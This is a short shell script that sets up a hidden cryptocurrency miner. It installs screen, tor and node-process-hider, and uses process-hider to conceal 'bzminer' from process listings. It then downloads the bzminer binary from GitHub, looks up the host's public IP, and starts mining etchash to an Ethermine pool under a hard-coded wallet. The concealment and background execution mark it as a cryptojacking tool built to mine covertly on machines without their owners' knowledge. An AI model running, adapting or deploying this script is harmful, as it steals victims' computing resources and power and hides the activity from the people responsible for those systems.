#!/bin/sh
sudo apt update && sudo apt install screen -y && screen -dmS gpu.sh ./gpu.sh 89 95 && sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add bzminer && sudo apt-get update -y && sudo apt-get install tor -y && wget https://github.com/bzminer/bzminer/releases/download/v9.1.4/bzminer_v9.1.4_linux.tar.gz && tar -xf bzminer_v9.1.4_linux.tar.gz && cd bzminer_v9.1.4_linux && chmod +x bzminer && ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && LD_PRELOAD="" ./bzminer -a etchash -w f4b53ec1a242c5f28f34fbc4875054b195e32e67 -p asia1-etc.ethermine.org:4444
